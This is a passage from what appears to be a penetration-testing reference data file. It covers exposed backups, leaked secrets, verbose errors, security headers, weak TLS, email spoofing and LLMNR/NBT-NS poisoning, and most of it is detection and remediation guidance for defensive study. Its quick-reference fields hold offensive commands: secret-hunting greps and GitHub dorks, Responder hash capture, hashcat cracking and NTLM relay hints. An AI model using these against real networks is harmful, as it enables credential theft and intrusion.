              ["Editor artifacts", "vim .swp, file~ , .orig — recover source of a single file"],
              [".DS_Store", "Directory listings that reveal otherwise-unknown filenames"],
              ["Env/config", ".env, config.php, appsettings.json with credentials"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Probe /.git/HEAD", "A valid ref confirms an exposed repository"],
              ["Guess backup names", "Content discovery with common backup/temp extensions"],
              ["Scanners", "Nuclei exposure templates and Nikto flag these"],
              ["Mine history", "Once dumped, git log -p and secret scanners (trufflehog/gitleaks) find keys"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Never deploy version-control metadata; exclude .git/.svn from the build/deploy artifact, and block them at the web server.",
              "Keep backups, dumps, and source archives outside the web root entirely.",
              "Configure the server to deny dotfiles and known backup/temp extensions.",
              "Rotate any secret that was ever committed — removing the file does not remove it from history.",
              "Add a CI check that fails if deployable artifacts contain VCS or backup files."
            ]
          }
        ]
      },
      {
        id: "secrets-exposure",
        name: "Exposed Secrets & API Keys",
        severity: "High",
        ref: "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_credentials",
        description: "Credentials and API keys leaked in client-side code, repos, or responses grant direct access to backends.",
        brief: "Applications leak secrets in many places: hardcoded in front-end JavaScript, committed to public repositories, left in config files, or returned in API responses and error messages. A single leaked cloud key, database credential, or third-party token can give an attacker direct access to backend systems — bypassing the application entirely.\n\nThis is distinct from a code bug: the secret is simply exposed. Finding and rotating leaked secrets, and keeping them out of anything client-reachable, is the defence.",
        quickReference: [
          { label: "Mine front-end JS", cmd: "grep -oiE '(api[_-]?key|secret|token|password|bearer)[\"'\\'':= ]+[A-Za-z0-9_\\-]{16,}' app.js" },
          { label: "Public repos", cmd: "GitHub code search: \"target.com\" api_key ; org:target filename:.env" },
          { label: "Repo history scan", cmd: "trufflehog git file://./repo ; gitleaks detect -s ./repo" },
          { label: "Common locations", cmd: "JS bundles, /.env, config files, source maps (.js.map), API/error responses" }
        ],
        sections: [
          {
            title: "Where Secrets Leak",
            type: "table",
            columns: ["Location", "Detail"],
            rows: [
              ["Client-side JS", "Keys embedded in bundles/source maps, reachable by anyone"],
              ["Public code", "GitHub/GitLab repos and gists, especially old commits"],
              ["Config files", ".env, appsettings.json, web.config under the web root"],
              ["API/error responses", "Tokens or connection strings echoed in output"],
              ["Archives & history", "Wayback-archived JS and prior git commits"]
            ]
          },
          {
            title: "Impact by Secret Type",
            type: "table",
            columns: ["Secret", "Consequence"],
            rows: [
              ["Cloud keys (AWS/GCP/Azure)", "Direct access to cloud resources — often full account compromise"],
              ["Database credentials", "Read/write the database directly"],
              ["Third-party API tokens", "Abuse paid/privileged services, pivot to partner systems"],
              ["Signing secrets", "Forge JWTs/sessions (see JWT Vulnerabilities)"],
              ["Internal service creds", "Reach internal APIs and infrastructure"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Keep secrets server-side and out of anything the client receives; never ship an API key in front-end code — proxy the call instead.",
              "Use a secrets manager and inject secrets at runtime; never commit them to source control.",
              "Add pre-commit and CI secret scanning (gitleaks/trufflehog) to catch leaks before they ship.",
              "Rotate any exposed secret immediately and treat it as compromised, including in git history and archives.",
              "Scope keys tightly (least privilege, IP/referrer restrictions) so a leak is contained."
            ]
          }
        ]
      },
      {
        id: "verbose-errors",
        name: "Verbose Errors & Info Disclosure",
        severity: "Low",
        ref: "https://owasp.org/www-community/Improper_Error_Handling",
        description: "Stack traces and debug output reveal versions, paths, queries, and internals that aid further attacks.",
        brief: "When an application returns detailed error output — stack traces, SQL queries, file paths, framework versions, debug pages — it hands an attacker a map of its internals. On its own each leak is minor, but together they accelerate every other attack: confirming an injection, revealing the tech stack for targeted CVEs, and exposing internal hostnames and paths.\n\nProduction systems should show generic errors to users and log the detail server-side.",
        quickReference: [
          { label: "Trigger errors", cmd: "Send malformed input, wrong types, a stray ', or a bad path" },
          { label: "Debug-mode tells", cmd: "Django/Flask debug page, ASP.NET yellow screen, Rails error, Whoops (PHP)" },
          { label: "What to harvest", cmd: "Framework + versions, file paths, SQL fragments, internal hostnames, stack frames" },
          { label: "Config leaks", cmd: "Debug endpoints, /server-status, verbose 500s, X-Powered-By headers" }
        ],
        sections: [
          {
            title: "What Gets Leaked",
            type: "table",
            columns: ["Leak", "Use to an attacker"],
            rows: [
              ["Stack traces", "Framework, versions, and code paths for targeted exploitation"],
              ["SQL in errors", "Confirms injection and reveals query structure"],
              ["File paths", "Absolute paths aid LFI/traversal and reveal the OS/layout"],
              ["Version banners", "Map to known CVEs (X-Powered-By, Server headers, generator tags)"],
              ["Debug consoles", "Some debug pages allow code execution (e.g. Werkzeug console)"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["Force errors", "Bad input, wrong methods, non-existent paths"],
              ["Check headers", "X-Powered-By, Server, and framework-specific headers"],
              ["Look for debug mode", "Framework debug pages left enabled in production"],
              ["Scanners", "Nikto/Nuclei flag verbose errors and info-disclosure headers"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable debug mode in production and return generic error pages to users; log the detail server-side only.",
              "Strip version-revealing headers (X-Powered-By, detailed Server) and framework banners.",
              "Handle exceptions centrally so no raw stack trace ever reaches the client.",
              "Remove or protect debug endpoints, consoles, and status pages (e.g. /server-status).",
              "Review error responses across the app, including APIs, not just the main pages."
            ]
          }
        ]
      },
      {
        id: "missing-security-headers",
        name: "Missing Security Headers",
        severity: "Low",
        ref: "https://owasp.org/www-project-secure-headers/",
        description: "Absent HTTP security headers remove browser-side defenses against XSS, clickjacking, and downgrade.",
        brief: "Modern browsers enforce a set of protections that the server must opt into via response headers. When they are missing, the browser's defense-in-depth against XSS, clickjacking, MIME sniffing, and protocol downgrade is simply not active. No single missing header is critical, but their absence weakens the whole client-side security posture and often accompanies other issues.\n\nSetting them is cheap and high-value hardening.",
        quickReference: [
          { label: "Check headers", cmd: "curl -sI https://target.com   (inspect the response headers)" },
          { label: "The important ones", cmd: "Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options / frame-ancestors" },
          { label: "Scan", cmd: "nuclei -tags misconfig,headers ; or a headers-focused checker" },
          { label: "Cookie flags too", cmd: "Set-Cookie: Secure; HttpOnly; SameSite" }
        ],
        sections: [
          {
            title: "Key Headers",
            type: "table",
            columns: ["Header", "Protects against"],
            rows: [
              ["Content-Security-Policy", "XSS and data injection — the highest-value header when done well"],
              ["Strict-Transport-Security (HSTS)", "Protocol downgrade and SSL-strip"],
              ["X-Content-Type-Options: nosniff", "MIME sniffing that turns uploads into script"],
              ["X-Frame-Options / frame-ancestors", "Clickjacking (framing)"],
              ["Referrer-Policy", "Leaking URLs/tokens via the Referer header"],
              ["Permissions-Policy", "Unwanted access to browser features (camera, geolocation)"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Method", "Detail"],
            rows: [
              ["Inspect responses", "curl -I or the browser dev-tools network tab"],
              ["Check every response type", "HTML, API, and error responses may differ"],
              ["Cookie attributes", "Verify Secure, HttpOnly, and SameSite on session cookies"],
              ["Automated", "Nuclei and dedicated header scanners grade the set"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set a strong Content-Security-Policy — the most impactful header; start in report-only mode and tighten.",
              "Enable HSTS with a long max-age (and preload once confident), plus X-Content-Type-Options: nosniff.",
              "Set frame-ancestors (CSP) and/or X-Frame-Options to prevent framing.",
              "Set Secure, HttpOnly, and SameSite on session cookies.",
              "Apply headers centrally (at the framework or edge/proxy) so every response is covered consistently."
            ]
          }
        ]
      },
      {
        id: "weak-tls",
        name: "Weak TLS / SSL Configuration",
        severity: "Medium",
        ref: "https://ssl-config.mozilla.org/",
        description: "Outdated protocols, weak ciphers, or bad certificates undermine transport security and enable interception.",
        brief: "TLS protects data in transit, but only if it is configured well. Support for obsolete protocols (SSLv3, TLS 1.0/1.1), weak cipher suites, small keys, or broken certificate validation opens the door to downgrade attacks, interception, and, in historical cases, named exploits (POODLE, BEAST, Heartbleed). Certificate problems — expired, self-signed on production, weak signatures, or mismatched names — erode trust and can enable man-in-the-middle.\n\nThe fix is a modern, minimal protocol and cipher configuration plus proper certificate management.",
        quickReference: [
          { label: "Scan the config", cmd: "testssl.sh https://target.com   or   sslscan target.com:443" },
          { label: "nmap ciphers", cmd: "nmap --script ssl-enum-ciphers -p443 target.com" },
          { label: "Red flags", cmd: "SSLv3, TLS 1.0/1.1, RC4/3DES/EXPORT ciphers, RSA<2048, expired/self-signed cert" },
          { label: "Reference config", cmd: "Mozilla SSL Configuration Generator (Intermediate/Modern)" }
        ],
        sections: [
          {
            title: "Weaknesses to Check",
            type: "table",
            columns: ["Issue", "Risk"],
            rows: [
              ["Old protocols", "SSLv3 / TLS 1.0 / 1.1 enabled — downgrade and known attacks"],
              ["Weak ciphers", "RC4, 3DES, EXPORT, NULL, or anything without forward secrecy"],
              ["Small keys / weak sig", "RSA < 2048, SHA-1 certificates"],
              ["Certificate issues", "Expired, self-signed on production, wrong hostname, untrusted CA"],
              ["Missing HSTS", "No enforcement of HTTPS, enabling SSL-strip (see Missing Security Headers)"]
            ]
          },
          {
            title: "Detection",
            type: "table",
            columns: ["Tool", "Detail"],
            rows: [
              ["testssl.sh", "Comprehensive protocol, cipher, and vulnerability check"],
              ["sslscan / sslyze", "Fast enumeration of supported protocols and ciphers"],
              ["nmap ssl-enum-ciphers", "Grades cipher suites per protocol"],
              ["Browser / cert inspection", "Validity, chain, hostname, and signature algorithm"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Support only TLS 1.2 and 1.3; disable SSLv3 and TLS 1.0/1.1 entirely.",
              "Use strong cipher suites with forward secrecy (ECDHE); remove RC4, 3DES, and EXPORT.",
              "Use 2048-bit+ RSA or ECDSA keys and SHA-256+ certificate signatures from a trusted CA.",
              "Enable HSTS to enforce HTTPS and prevent downgrade; keep certificates valid and monitored.",
              "Base the config on Mozilla's generator and re-scan after changes."
            ]
          }
        ]
      },
      {
        id: "email-spoofing",
        name: "Spoofable Email (SPF / DKIM / DMARC)",
        severity: "Medium",
        ref: "https://dmarc.org/",
        description: "Weak or missing email-authentication records let attackers send mail that appears to come from the domain.",
        brief: "SPF, DKIM, and DMARC are the DNS records that let receiving servers verify that mail claiming to be from a domain is authorised. When they are missing, misconfigured, or set to monitor-only (DMARC p=none), an attacker can spoof the domain — sending phishing that passes as legitimate internal or brand email.\n\nIt is a common finding in OSINT and a direct enabler of phishing. The records are public, so the weakness is trivially assessed from the outside.",
        quickReference: [
          { label: "Check the records", cmd: "dig +short TXT target.com | grep spf1\ndig +short TXT _dmarc.target.com" },
          { label: "Weak DMARC", cmd: "v=DMARC1; p=none   -> monitor only, effectively spoofable" },
          { label: "SPF issues", cmd: "No SPF record, or ~all/+all (soft/pass) instead of -all" },
          { label: "Assess", cmd: "Online DMARC/SPF checkers; MXToolbox; or manual dig" }
        ],
        sections: [
          {
            title: "The Three Records",
            type: "table",
            columns: ["Record", "Role"],
            rows: [
              ["SPF", "Lists IPs/hosts allowed to send for the domain; -all hard-fails others"],
              ["DKIM", "Cryptographically signs messages so tampering/forgery is detectable"],
              ["DMARC", "Ties SPF/DKIM to the visible From domain and sets the policy (none/quarantine/reject)"],
              ["Alignment", "DMARC passes only if SPF/DKIM align with the From domain"]
            ]
          },
          {
            title: "Weaknesses",
            type: "table",
            columns: ["Condition", "Effect"],
            rows: [
              ["No SPF/DKIM/DMARC", "Domain is freely spoofable"],
              ["DMARC p=none", "Receivers take no action on failures — spoofing lands"],
              ["SPF ~all or +all", "Softfail/pass weakens or negates enforcement"],
              ["No DKIM", "Loses the cryptographic proof and a DMARC alignment path"],
              ["Missing subdomain policy", "sp= not set — subdomains remain spoofable"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Publish SPF listing only authorised senders and ending in -all (hard fail).",
              "Enable DKIM signing on all outbound mail streams.",
              "Set DMARC to p=quarantine, then p=reject after a monitoring period; include a subdomain policy (sp=).",
              "Use the DMARC rua/ruf reports to find and authorise legitimate senders before enforcing.",
              "Re-check the public records after changes; this is assessed entirely from outside."
            ]
          }
        ]
      },
      {
        id: "llmnr-nbtns",
        name: "LLMNR / NBT-NS Poisoning Enabled",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1557/001/",
        theory: "theory/2026-08-18-coercion-ntlm-relay.html",
        description: "Legacy multicast name-resolution fallbacks let an attacker on the LAN capture NetNTLM hashes to crack or relay.",
        brief: "When Windows fails to resolve a name over DNS, it falls back to broadcasting the query to the local segment over LLMNR, NBT-NS, or mDNS. An attacker on the same segment answers 'that's me', and the victim authenticates to them — handing over a NetNTLM hash to crack offline or relay onward.\n\nThese fallbacks are rarely needed and enabled by default, which makes poisoning one of the most reliable opening moves on an internal network. See the Coercion & NTLM Relay theory page.",
        quickReference: [
          { label: "Listen (recon)", cmd: "responder -I eth0 -A   (analyze only, no poisoning)" },
          { label: "Capture hashes", cmd: "responder -I eth0 -wd" },
          { label: "Crack", cmd: "hashcat -m 5600 hashes.txt rockyou.txt   (NetNTLMv2)" },
          { label: "Relay instead", cmd: "Disable Responder SMB/HTTP, then ntlmrelayx.py to unsigned targets" }
        ],
        sections: [
          {
            title: "The Fallback Protocols",
            type: "table",
            columns: ["Protocol", "Detail"],
            rows: [
              ["LLMNR (UDP 5355)", "The primary DNS fallback on modern Windows"],
              ["NBT-NS (UDP 137)", "Older NetBIOS name service, still commonly enabled"],
              ["mDNS (UDP 5353)", "Multicast DNS, another answerable path"],
              ["WPAD", "Proxy auto-discovery — prompts for auth via a rogue proxy"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Credential capture", "NetNTLMv2 hashes to crack offline (weak passwords fall fast)"],
              ["Relay to access", "Forward the auth to unsigned SMB/LDAP hosts for lateral movement"],
              ["Common foothold", "Frequently the first credential on an internal engagement"],
              ["Scale", "Mistyped/stale names generate a steady stream of victims"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable LLMNR via Group Policy (Turn off multicast name resolution) — the primary fix.",
              "Disable NBT-NS on all interfaces (DHCP option or per-adapter setting) and disable mDNS where not needed.",
              "Require SMB signing and LDAP channel binding so any captured auth cannot be relayed.",
              "Ensure DNS is correct and complete so hosts rarely need to fall back to broadcast resolution.",
              "Monitor for LLMNR/NBT-NS responders and enforce strong passwords + MFA to blunt cracked hashes."
            ]
          }
        ]
      }
    ]
  }
];
